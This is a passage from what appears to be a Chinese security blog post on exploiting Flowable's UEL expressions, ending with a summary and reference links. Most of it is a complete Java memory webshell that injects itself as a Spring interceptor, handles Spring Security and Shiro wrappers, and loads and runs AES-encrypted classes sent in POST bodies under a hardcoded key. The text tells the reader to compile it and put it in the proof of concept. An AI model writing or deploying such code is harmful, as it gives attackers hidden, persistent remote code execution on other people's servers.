2. SpringBoot+SpringSecurity 配合使用时，`org.springframework.web.servlet.HandlerInterceptor#preHandle`中request的运行类型实际是`org.springframework.security.web.servletapi.HttpServlet3RequestFactory$Servlet3SecurityContextHolderAwareRequestWrapper`，无法在原有的代码上直接执行，需要先处理成`org.apache.catalina.connector.RequestFacade`  
    修改完成后的代码

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import liquibase.pro.packaged.A;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.springframework.context.ConfigurableApplicationContext;
import org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestWrapper;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.handler.MappedInterceptor;
import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;

public class A12345 extends AbstractTranslet implements HandlerInterceptor {
    public A12345() {
    }

    public void transform(DOM var1, SerializationHandler[] var2) throws TransletException {
    }

    public void transform(DOM var1, DTMAxisIterator var2, SerializationHandler var3) throws TransletException {
    }

    public boolean preHandle(HttpServletRequest req1, HttpServletResponse resp, Object var3) throws Exception {
        HttpServletRequest request = req1;
        // 兼容springboot + springSecurity
        if (req1.getClass().getName().contains("Servlet3SecurityContextHolderAwareRequestWrapper")) {
            SecurityContextHolderAwareRequestWrapper securityContextHolderAwareRequestWrapper = (SecurityContextHolderAwareRequestWrapper) req1;
            HttpServletRequestWrapper httpServletRequestWrapper = (HttpServletRequestWrapper) securityContextHolderAwareRequestWrapper.getRequest();
            HttpServletRequestWrapper httpServletRequestWrapper1 = (HttpServletRequestWrapper) httpServletRequestWrapper.getRequest();
            request = (HttpServletRequest) httpServletRequestWrapper1.getRequest();
        }

        // 兼容Springboot + shiro
        if (req1.getClass().getName().contains("ShiroHttpServletRequest")) {
            request = (HttpServletRequest) ((HttpServletRequestWrapper) req1).getRequest();
        }

        if (request.getMethod().equals("POST")) {
            Field var4 = ((RequestFacade) request).getClass().getDeclaredField("request");
            var4.setAccessible(true);
            Request var5 = (Request) var4.get(request);
            Response var6 = var5.getResponse();
            HttpSession var7 = var5.getSession();
            HashMap var8 = new HashMap();
            var8.put("request", var5);
            var8.put("response", var6);
            var8.put("session", var7);
            String var9 = "e45e329feb5d925b";
            var7.putValue("u", var9);
            Cipher var10 = Cipher.getInstance("AES");
            var10.init(2, new SecretKeySpec(var9.getBytes(), "AES"));
            ClassLoader var11 = Thread.currentThread().getContextClassLoader();
            Class var12 = Class.forName("java.lang.ClassLoader");
            Method var13 = var12.getDeclaredMethod("defineClass", String.class, byte[].class, Integer.TYPE, Integer.TYPE);
            var13.setAccessible(true);
            byte[] var14 = var10.doFinal((new BASE64Decoder()).decodeBuffer(var5.getReader().readLine()));
            Class var15 = (Class) var13.invoke(var11, null, var14, 0, var14.length);
            var15.newInstance().equals(var8);
            return false;
        } else {
            return true;
        }
    }

    static {
        try {
            Field applicationContextsField = Class.forName("org.springframework.context.support.LiveBeansView").getDeclaredField("applicationContexts");
            applicationContextsField.setAccessible(true);
            LinkedHashSet<ConfigurableApplicationContext> hashSet = (LinkedHashSet<ConfigurableApplicationContext>) applicationContextsField.get(null);
            WebApplicationContext webApplicationContext;
            Iterator<ConfigurableApplicationContext> iterator = hashSet.iterator();
            while (iterator.hasNext()) {
                ConfigurableApplicationContext configurableApplicationContext = iterator.next();
                if (configurableApplicationContext instanceof WebApplicationContext) {
                    webApplicationContext = (WebApplicationContext) configurableApplicationContext;
                    AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping) webApplicationContext.getBean("requestMappingHandlerMapping");
                    Field adaptedInterceptorsField = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
                    adaptedInterceptorsField.setAccessible(true);
                    List adaptedInterceptors = (List) adaptedInterceptorsField.get(abstractHandlerMapping);
                    adaptedInterceptors.add(0, new MappedInterceptor(new String[]{"/xxx"}, (String[]) null, new A12345()));
                    adaptedInterceptorsField.set(abstractHandlerMapping, adaptedInterceptors);

                    Object resourceHandlerMapping = webApplicationContext.getBean("resourceHandlerMapping");
                    if (!resourceHandlerMapping.toString().equals("null")) {
                        AbstractHandlerMapping abstractHandlerMapping1 = (AbstractHandlerMapping) resourceHandlerMapping;
                        List o = (List) adaptedInterceptorsField.get(abstractHandlerMapping1);
                        o.add(0, new MappedInterceptor(new String[]{"/xxx"}, (String[]) null, new A12345()));
                        adaptedInterceptorsField.set(abstractHandlerMapping1, o);
                    }
                }
            }
        } catch (Exception var8) {
            var8.printStackTrace();
        }
    }
}
```

剩下的就是把文件编译成class-&gt;再转成base64字符串替换到poc中即可

总结
--

flowable说到底只是个构建流程的东西，构建流程一般都是属于后台的功能，前台基本上是不存在这种功能，所以在实际的利用中还需要先进后台再进一步利用（当然有时也会遇见一些能够直接访问部署的接口）。另外，flowable支持UEL表达式是全版本的，并且官方也并不认为这是一种漏洞，所以如果开发没有做其他修改时，看到flowable基本上就等于是漏洞到手了。

参考链接
----

[Flowable BPMN 用户手册](https://tkjohn.github.io/flowable-userguide/#bpmnConstructs)  
[一些jar包相关的漏洞](https://github.com/Mechoy/jarVuln)